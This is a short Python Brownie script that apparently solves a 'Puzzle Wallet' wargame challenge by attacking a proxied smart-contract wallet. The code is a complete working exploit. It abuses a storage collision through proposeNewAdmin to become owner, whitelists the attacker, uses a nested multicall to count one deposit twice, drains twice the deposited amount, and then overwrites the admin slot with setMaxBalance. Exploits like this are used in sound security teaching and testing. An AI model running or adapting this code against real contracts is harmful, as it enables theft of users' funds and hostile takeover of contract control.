from brownie import accounts, config, interface

def become_owner(target, hacker):
    proxy = interface.IPuzzleProxy(target)
    proxy.proposeNewAdmin(hacker, {'from': hacker})

def withdraw(target, hacker):
    wallet = interface.IPuzzleWallet(target)
    wallet.addToWhitelist(hacker, {'from': hacker})
    amount = wallet.balance()
    deposit_data = wallet.deposit.encode_input()
    execute_data = wallet.execute.encode_input(hacker, 2 * amount, b'')
    inception_data = wallet.multicall.encode_input([deposit_data])
    wallet.multicall([deposit_data, inception_data, execute_data], {'from': hacker, 'amount': amount})

def become_admin(target, hacker):
    wallet = interface.IPuzzleWallet(target)
    wallet.setMaxBalance(hacker.address, {'from': hacker})

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    become_owner(target, hacker)
    withdraw(target, hacker)
    become_admin(target, hacker)
